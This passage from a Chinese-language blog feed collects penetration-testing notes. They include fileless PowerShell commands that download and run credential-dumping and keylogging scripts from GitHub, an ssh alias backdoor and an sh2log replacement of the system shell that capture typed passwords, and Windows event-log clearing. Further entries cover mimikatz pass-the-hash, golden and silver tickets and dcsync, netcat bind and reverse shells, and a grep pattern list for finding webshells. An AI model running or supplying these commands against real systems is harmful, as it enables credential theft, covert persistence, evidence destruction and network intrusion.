HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><p>Kali远程桌面连接Win7 </p><pre><code>rdesktop 192.168.209.160:3389</code></pre><h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><ul><li>打齐补丁</li><li>关闭135、139、445端口。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Se
      
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="metasploit" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/metasploit/"/>
    
    
  </entry>
  
  <entry>
    <title>powershell gethash</title>
    <link href="http://yoursite.com/2018/12/05/powershell-gethash/"/>
    <id>http://yoursite.com/2018/12/05/powershell-gethash/</id>
    <published>2018-12-05T12:45:31.000Z</published>
    <updated>2018-12-05T12:47:58.815Z</updated>
    
    <content type="html"><![CDATA[<p>使用powershell远程调用来抓取hash。</p><p>在线导hash:</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&apos;);Get-PassHashes</code></pre><p>在线导明文</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用powershell远程调用来抓取hash。&lt;/p&gt;
&lt;p&gt;在线导hash:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&amp;apos;https://raw.github
      
    
    </summary>
    
      <category term="骚操作" scheme="http://yoursite.com/categories/%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux查找webshell</title>
    <link href="http://yoursite.com/2018/12/05/Linux%E6%9F%A5%E6%89%BEwebshell/"/>
    <id>http://yoursite.com/2018/12/05/Linux查找webshell/</id>
    <published>2018-12-05T12:38:16.000Z</published>
    <updated>2018-12-05T12:44:09.033Z</updated>
    
    <content type="html"><![CDATA[<p>在网站目录差找如下关键字：</p><pre><code>grep -Rn &quot;shell_exec *(&quot; /var/wwwgrep -Rn &quot;base64_decode *(&quot; /var/wwwgrep -Rn &quot;phpinfo *(&quot; /var/wwwgrep -Rn &quot;system *(&quot; /var/wwwgrep -Rn &quot;php_uname *(&quot; /var/wwwgrep -Rn &quot;chmod *(&quot; /var/wwwgrep -Rn &quot;fopen *(&quot; /var/wwwgrep -Rn &quot;fclose *(&quot; /var/wwwgrep -Rn &quot;readfile *(&quot; /var/wwwgrep -Rn &quot;edoced_46esab *(&quot; /var/wwwgrep -Rn &quot;eval *(&quot; /var/wwwgrep -Rn &quot;pwd&quot; /var/wwwgrep -Rn &quot;pass&quot; /var/wwwgrep -Rn &quot;pw&quot; /var/wwwgrep -Rn 密码&quot; /var/www</code></pre><blockquote><p>grep -rn：忽略大小写</p></blockquote><p>find:</p><pre><code>find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在网站目录差找如下关键字：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep -Rn &amp;quot;shell_exec *(&amp;quot; /var/www

grep -Rn &amp;quot;base64_decode *(&amp;quot; /var/www

grep -Rn &amp;quot;
      
    
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
    
    
  </entry>
  
  <entry>
    <title>命令行下的信息收集</title>
    <link href="http://yoursite.com/2018/12/05/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2018/12/05/命令行下的信息收集/</id>
    <published>2018-12-05T12:16:29.000Z</published>
    <updated>2018-12-06T09:04:58.734Z</updated>
    
    <content type="html"><![CDATA[<p>域用户信息</p><pre><code>whoami /user 查看当前用户的用户名和sidwhoami /groups 查看当前用户所属的用户组whoami /priv 查看当前用户的权限</code></pre><p>用户及用户组信息    </p><pre><code>net group /domain 查看域中的用户组net group &quot;domain admins&quot; /domain 获得域管理员列表net group &quot;domain controllers&quot; /domain 获得域控制器列表net group &quot;domain computers&quot; /domain 获得所有域成员计算机列表net user /domain 查看域中的用户net accounts /domain 获得域密码策略、密码长短等信息。net view /domain 查看所有域或工作组</code></pre><p>离线凭证收集-提取域用户hash</p><p>域用户hash存储在ntds.dit里。他的位置一般在域控上<code>%WINDIR%\ntds\ntds.dit</code></p><p>使用wmic识别安装到系统中的补丁情况</p><pre><code>wmic qfe get description,installedOn</code></pre><p>识别正在运行的服务</p><pre><code>sc query type= service或net start</code></pre><p>识别开机启动的程序，包括路径</p><pre><code>wmic startup list full</code></pre><p>ping探测存活主机</p><pre><code>for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr &quot;TTL=&quot; &gt;&gt; ping.txt</code></pre><p>查看系统中网卡的IP地址和MAC地址</p><pre><code>wmic nicconfig get ipaddress,macaddress</code></pre><p>查看当前系统是否有屏保保护，延迟是多少</p><pre><code>wmic desktop get screensaversecure,screensavertimeout</code></pre><p>查看系统中开放的共享</p><pre><code>wmic share get name,path或net share</code></pre><p>查看系统中开启的日志</p><pre><code>wmic nteventlog get path,filename,writeable</code></pre><p>清除相关的日志（这里是全部清除）</p><pre><code>wevtutil cl &quot;windows powershell&quot;wevtutil cl &quot;security&quot;wevtutil cl &quot;system&quot;</code></pre><p>查看系统中安装的软件以及版本</p><pre><code>wmic product get name,version</code></pre><p>查看某个进程的详细信息 （路径，命令行参数等）</p><pre><code>wmic process where name=&quot;chrome.exe&quot; list full</code></pre><p>终止一个进程</p><pre><code>wmic process where name=&quot;xshell.exe&quot; call terminatentsd -c q -p 进程的PID</code></pre><p>显示系统中的曾经连接过的无线密码</p><pre><code>netsh wlan show profiles netsh wlan show profiles name=&quot;profiles的名字&quot; key=clear</code></pre><p>查看当前系统是否是VMWARE</p><pre><code>wmic bios list full | find /i &quot;vmware&quot;</code></pre><p>可以用<code>wmic /?</code>查看具体用法</p><ul><li><code>Process</code> -进程信息</li><li><code>Service</code> -服务</li><li><code>Share</code> -共享</li><li><code>DataFile</code> -文件及目录</li><li><code>Volume</code> -磁盘卷列表</li></ul><h2 id="一些收集工具"><a href="#一些收集工具" class="headerlink" title="一些收集工具"></a>一些收集工具</h2><h3 id="setspn-exe"><a href="#setspn-exe" class="headerlink" title="setspn.exe"></a>setspn.exe</h3><p>Setspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的SPN。</p><p>查看账户college的SPN</p><pre><code>Setspn -L college</code></pre><p>查看当前域中的所有SPN</p><pre><code>Setspn -T * -Q */*</code></pre><h3 id="ADFind-exe"><a href="#ADFind-exe" class="headerlink" title="ADFind.exe"></a>ADFind.exe</h3><p>Adfind是一款活动目录查询工具。</p><p><a href="http://www.joeware.net/freetools/tools/adfind/" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/</a></p><p>列出域控列表</p><pre><code>Adfind.exe -sc dclist</code></pre><p>查询域中活动的主机，输出主机名和域名</p><pre><code>Adfind.exe -sc computers_active name dnshostname </code></pre><p>获取域内主机信息</p><pre><code>AdFind.exe -b dc=school,dc=com -f &quot;objectcategory=computer&quot;</code></pre><p>查询域中主机的spn</p><pre><code>AdFind.exe -b cn=computers,dc=school,dc=com servicePrincipalName</code></pre><h3 id="Netview-exe"><a href="#Netview-exe" class="headerlink" title="Netview.exe"></a>Netview.exe</h3><p>Netview 能够收集域内主机共享、IP、是否为域控等信息。</p><p><a href="https://github.com/mubix/netview" target="_blank" rel="noopener">https://github.com/mubix/netview</a></p><p>将主机名（或IP地址）列表保存在文件host.txt中，使用<code>netview -f host.txt</code>来信息收集。</p><h3 id="Netsses-exe"><a href="#Netsses-exe" class="headerlink" title="Netsses.exe"></a>Netsses.exe</h3><p>工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。</p><p><a href="http://www.joeware.net/freetools/tools/netsess/index.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p><p>如果有一台域成员（192.168.1.128）机器<code>net view</code>了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户：</p><pre><code>netsess-h 192.168.1.130-c\\192.168.1.128</code></pre><p>这里的<code>-h</code>参数指定了服务器的地址，<code>-c</code>参数则指定了客户端的地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域用户信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;whoami /user 查看当前用户的用户名和sid
whoami /groups 查看当前用户所属的用户组
whoami /priv 查看当前用户的权限
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户及用户组信息    &lt;/p&gt;
&lt;pre
      
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>密码记录工具</title>
    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2018/12/05/密码记录工具/</id>
    <published>2018-12-05T08:15:02.000Z</published>
    <updated>2018-12-05T11:40:10.277Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。</p><h1 id="Windows-Powershell"><a href="#Windows-Powershell" class="headerlink" title="Windows Powershell"></a>Windows Powershell</h1><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvyc3cbrnj30dm08vq4m.jpg" alt=""></p><h1 id="Get-Keystrokes-ps1"><a href="#Get-Keystrokes-ps1" class="headerlink" title="Get-Keystrokes.ps1"></a>Get-Keystrokes.ps1</h1><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1</a></p><p>远程下载执行：</p><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><h1 id="Invoke-CredentialsPhish-ps1"><a href="#Invoke-CredentialsPhish-ps1" class="headerlink" title="Invoke-CredentialsPhish.ps1"></a>Invoke-CredentialsPhish.ps1</h1><p>Invoke-CredentialsPhish是nishang中的一个钓鱼工具，它能在目标桌面上弹出一个认证窗口。<br>不管是点击关闭，确定，还是取消，这个窗口都会反复弹出，除非用户输入正确的密码或是直接kill掉powershell进程。</p><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvz7vsiiqj309p08mdgp.jpg" alt=""></p><h1 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h1><h1 id="Linux-alias"><a href="#Linux-alias" class="headerlink" title="Linux alias"></a>Linux alias</h1><p>在~/.bashrc下添加如下一行：</p><pre><code>alias ssh=&apos;strace -o /var/tmp/.syscache-`date +&apos;%Y-%m-%d+%H:%m:%S&apos;`.log -s 4096 ssh&apos;</code></pre><p>再使更改生效：</p><pre><code>source ~/.bashrcapt-get install strace        //若缺少此软件，需要安装</code></pre><p>当有用户使用ssh命令时，会生成一个Log文件：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw0qzzxsqj30ke0dk0v6.jpg" alt=""></p><p>但是内容有点多，需要筛选一下：</p><pre><code>cat .syscache-2018-11-20+14\:11\:54.log  | grep  &quot;read(4&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw0r8uoz1j30k20bgq45.jpg" alt=""></p><h1 id="sh2log"><a href="#sh2log" class="headerlink" title="sh2log"></a>sh2log</h1><p>ubuntu下载sh2log：</p><pre><code>wget http://packetstorm.foofus.com/UNIX/loggers/sh2log-1.0.tgz</code></pre><p>解压压缩包：</p><pre><code>tar –xvf sh2log-1.0.tgz</code></pre><p>Cd进入sh2log-1.0文件夹 安装libx11-dev</p><pre><code>sudo apt-get install libxll-dev</code></pre><p>安装完成后，编译sh2log：</p><p>输入make linux</p><p>新建一个shell脚本，脚本内容如下：</p><pre><code>sudo mkdir /bin/shells/sudo cp -p /bin/{sh,bash} /bin/shells/sudo rm -f /bin/{sh,bash}sudo cp -p sh2log /bin/bashsudo cp -p sh2log /bin/sh ./sh2logd</code></pre><p>保存脚本，添加执行权限：</p><pre><code>chmod +x  ./1.sh</code></pre><p>运行脚本：</p><pre><code>./1.sh</code></pre><p>启动后，可以用<code>ps -ef|grep sh2logd</code>来检查是否成功启动，它会在安装目录下生成一个bin文件</p><p>查看的话可以用parser这个工具查看：<code>./parser xxxxx.bin</code></p><p>输入bash，打开一个新的she11，随意输入一些命令 之后使用文件夹中的parser工具，</p><pre><code>./parser sh2log-xxxxx.bin</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。&lt;
      
    
    </summary>
    
      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>密码提取神器--mimikatz</title>
    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E7%A5%9E%E5%99%A8-mimikatz/"/>
    <id>http://yoursite.com/2018/12/05/密码提取神器-mimikatz/</id>
    <published>2018-12-05T06:57:03.000Z</published>
    <updated>2018-12-06T13:42:22.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mimikatz抓取用户密码"><a href="#mimikatz抓取用户密码" class="headerlink" title="mimikatz抓取用户密码"></a>mimikatz抓取用户密码</h2><p><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203</a></p><p>mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden tickets等数种黑客技术。</p><p>mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令：</p><pre><code>privilege::debug #提升权限sekurlsa::logonpasswords #抓取密码</code></pre><blockquote><p>输入aaa::aaa，可展示所有模块</p></blockquote><p>可采用log命令，保存为日志</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwgt2walj30wh0hhmy1.jpg" alt=""></p><blockquote><p>要以管理员身份进入mimikatz</p></blockquote><p>用cmd5去爆破NTML值</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwi10mj0j30kk099dfw.jpg" alt=""></p><p>要钱，算了….</p><p>修改注册表，启用摘要密码支持</p><p>需要创建UseLogonCredential，并赋值为1</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwtjmhb7j30hf0eb0tf.jpg" alt=""></p><p>重新登录后，再次运行就可以抓取到明文密码啦。</p><h2 id="mimikatz令牌窃取"><a href="#mimikatz令牌窃取" class="headerlink" title="mimikatz令牌窃取"></a>mimikatz令牌窃取</h2><p>Windows有两种类型的Token：</p><ul><li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</li><li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li></ul><blockquote><p>两种token只在系统重启后清除</p></blockquote><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><h3 id="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><a href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token" class="headerlink" title="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"></a>使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</h3><p>以管理员身份运行mimikatz——&gt;使用<code>privilege::debug</code>获取debug权限——&gt;使用<code>token::elevate</code>模仿system用户的令牌——&gt;使用<code>token::list</code>列出令牌——&gt;使用 <code>lsadump::sam</code>来获取sam数据库中的密码——&gt;使用<code>token::revert</code>恢复令牌</p><h2 id="Mimikatz后渗透"><a href="#Mimikatz后渗透" class="headerlink" title="Mimikatz后渗透"></a>Mimikatz后渗透</h2><p>在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。</p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h3><pre><code>sekurlsa::pth /domain:GUOXIANG.com /user:administrator /ntlm 保存的hash</code></pre><h3 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h3><p>查看当前用户的ticket</p><pre><code>Kerberos::list</code></pre><p>导出当前用户的ticket</p><pre><code>Kerberos::list /export</code></pre><p>查看所有ticket</p><pre><code>Sekurlsa::tickets</code></pre><p>导出所有ticket</p><pre><code>Sekurlsa::tickets /export</code></pre><p>获得需要的票据后，可以在其他机器上导入此票据：</p><pre><code>Kerberos:ptt 票据名</code></pre><p>导入不依赖管理员权限，比较方便。假设导入了域管的票据，则我们可以dir域控的c$共享：<code>Dir\\DC\c$</code>来进行测试。</p><p>需要注意的是UNC路径中需要使用主机名DC，而不能使用172.17.1.1这样的ip地址，否则可能会被拒绝访问。</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>黄金票据（golden ticket）是一种为任意用户生成TGT票据的方法。只要获取<strong>kribtgt账户的密码HASH</strong>、<strong>域sid</strong>、<strong>域名</strong>和<strong>域账户</strong>，黄金票据即可离线生成，而且不受TGT生命周期的影响（默认10小时，最多续订7天）</p><h3 id="kribtgt账户的密码HASH"><a href="#kribtgt账户的密码HASH" class="headerlink" title="kribtgt账户的密码HASH"></a>kribtgt账户的密码HASH</h3><p>kribtgt账户的密码hash存储在域控制器上，因此需要获得域管理员权限。</p><p>获取krbtgt的hash：</p><pre><code>lsadump::dcsync /domain:GUOXIANG.com /user:krbtgt</code></pre><p>我们可以使用<code>aes256_hmac</code>这一行的hash。</p><h3 id="域sid"><a href="#域sid" class="headerlink" title="域sid"></a>域sid</h3><p>域的sid可以使用工具<strong>psgetsid</strong>获取，也可以在获取域成员shell后使用<code>whoami /user</code>获取。例如域用户sid为<code>S-1-5-21-3187487621-2881332574-933047120-1105</code>，则1105之前的就是域sid</p><h3 id="生成黄金票据"><a href="#生成黄金票据" class="headerlink" title="生成黄金票据"></a>生成黄金票据</h3><p>获取到上述信息后，就可以使用mimikatz的<code>kerberos::golden</code>生成黄金票据</p><pre><code>Kerberos::golden /user：guoxiang /sid:域sid /aes256:krbtgt账户aes256加密的hash /domain:GUOXIANG.com /ticket:golden.kirbi</code></pre><p>当需要使用黄金票据的时候，使用mimikatz：</p><pre><code>Kerberos:ptt golden.kribi</code></pre><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>黄金票据伪造的是TGT，而白银票据则伪造ST。</p><p>由于ST针对特定的服务，因此白银票据只能用来<strong>认证特定服务</strong>，而黄金票据则可以用于<strong>认证任何kerberos服务</strong>。</p><p>使用白银票据并不需要和域控通信（使用ST直接和目标服务器通信），而使用黄金票据则需要与域控通信（需要使用伪造的TGT来获取ST）</p><h3 id="生成白银票据"><a href="#生成白银票据" class="headerlink" title="生成白银票据"></a>生成白银票据</h3><p>生成白银票据需要：</p><ul><li>域名</li><li>sid</li><li>用户名：可以是任意用户</li><li>服务名：如cifs、ldap等</li><li>目标计算机账户密码hash（<strong>这里需要win-xxxxxx$这类账户的ntlm hash，否则会导致认证失败</strong>）</li></ul><p>获取到上述信息后：</p><pre><code>kerberos::golden /admin:guoxiang /domain:GUOXIANG.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 target:guoxiang.GUOXIANG.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt</code></pre><p>到处白银票据。</p><p>Mimikatz中的<strong>dcsync</strong>通过<strong>drsr  协议</strong>向域控发起复制用户凭证的请求。使用这种方式，无需登录到域控上，只通过网络就能够获取用户的凭证。前面讲解的黄金和白银票据可以实现对域控的持久访问，配合dcsync即可在域成员主机上提取凭证。</p><h2 id="Powershell版的Mimikatz"><a href="#Powershell版的Mimikatz" class="headerlink" title="Powershell版的Mimikatz"></a>Powershell版的Mimikatz</h2><p>一句话执行：</p><pre><code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre><p>无文件执行：</p><pre><code>powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mimikatz抓取用户密码&quot;&gt;&lt;a href=&quot;#mimikatz抓取用户密码&quot; class=&quot;headerlink&quot; title=&quot;mimikatz抓取用户密码&quot;&gt;&lt;/a&gt;mimikatz抓取用户密码&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu
      
    
    </summary>
    
      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>nc命令使用</title>
    <link href="http://yoursite.com/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/12/04/nc命令使用/</id>
    <published>2018-12-04T15:07:24.000Z</published>
    <updated>2018-12-04T15:12:54.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Netcat-nc"><a href="#Netcat-nc" class="headerlink" title="Netcat(nc):"></a>Netcat(nc):</h1><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p><p>Nc可以在两台设备上面相互交互，即侦听模式/传输模式</p><ul><li>Telnet功能</li><li>获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件，默认不加密</li><li>远程控制</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><ul><li>-n 以数字形式表示的IP地址</li><li>-v 显示详细信息 [使用=vv获取更详细的信息</li><li>-l 监听入站信息</li><li>-p port 本地端口</li><li>-q secs 在标准输入且延迟后退出</li><li>-c shell commands shell模式</li><li>-u UDP模式</li><li>-s addr 本地源地址</li><li>-h 获取帮助信息</li><li>-z I/O 模式 [扫描时使用]</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><pre><code>A:nc -lp port -c bashB:nc ip port</code></pre><p>A将自己的Bash发给B</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><pre><code>A:nc -lp portB:nc ip port -c bash</code></pre><p>B将自己的Bash发给A</p><blockquote><p>win下Bash换成cmd</p></blockquote><p>通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell</p><h2 id="使用NC进行信息收集"><a href="#使用NC进行信息收集" class="headerlink" title="使用NC进行信息收集"></a>使用NC进行信息收集</h2><h3 id="简单的建立连接，就是侦听模式和传输模式"><a href="#简单的建立连接，就是侦听模式和传输模式" class="headerlink" title="简单的建立连接，就是侦听模式和传输模式"></a>简单的建立连接，就是侦听模式和传输模式</h3><ul><li>nc -lp port  监听指定端口号</li><li>nc -nv ip port  连接对方tcp端口，默认情况下，双方可以发送文本信息</li></ul><h3 id="收集目标机上的进程信息"><a href="#收集目标机上的进程信息" class="headerlink" title="收集目标机上的进程信息"></a>收集目标机上的进程信息</h3><ul><li>nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地</li><li>Ps aux |nc -nv ip port -q 1  标准输入完成后delay一秒钟，会发送到侦听端</li></ul><h2 id="NC传输文件-目录"><a href="#NC传输文件-目录" class="headerlink" title="NC传输文件/目录"></a>NC传输文件/目录</h2><ul><li>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</li><li>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<blockquote><p>侦听端的文件名最好按照文件本身来命名</p></blockquote></li></ul><p><strong>将目录打包：</strong></p><p>tar -cvf - 目录名/|nc -lp port -q 1</p><p><strong>将目录解包</strong></p><p>nc -nv ip port |tar -xvf -</p><p><strong>NC端口扫描</strong></p><p>nc -nvz ip 1-65535</p><h2 id="NC文件加密传输"><a href="#NC文件加密传输" class="headerlink" title="NC文件加密传输"></a>NC文件加密传输</h2><pre><code>apt-get install mcryptA： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1</code></pre><p>B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。<br>主要是利用mcrypt进行加密</p><h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>nc -nvz ip 1-65535</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg" alt=""></p><p>默认使用tcp进行扫描</p><h2 id="NC复制磁盘"><a href="#NC复制磁盘" class="headerlink" title="NC复制磁盘"></a>NC复制磁盘</h2><pre><code>A:nc -lp port |dd of=/dev/sdaB: dd if=/dev/sda | nc -nc ip port -q 1</code></pre><ul><li>If是input filter</li><li>Of 是output filter</li></ul><p>B将数据复制到A挂载的硬盘上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Netcat-nc&quot;&gt;&lt;a href=&quot;#Netcat-nc&quot; class=&quot;headerlink&quot; title=&quot;Netcat(nc):&quot;&gt;&lt;/a&gt;Netcat(nc):&lt;/h1&gt;&lt;p&gt;NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。&lt;/p
      
    
    </summary>
    
      <category term="命令使用" scheme="http://yoursite.com/categories/%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>常见的漏洞端口</title>
    <link href="http://yoursite.com/2018/12/04/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3/"/>
    <id>http://yoursite.com/2018/12/04/常见的漏洞端口/</id>
    <published>2018-12-04T07:48:29.000Z</published>
    <updated>2018-12-12T09:15:44.733Z</updated>
    
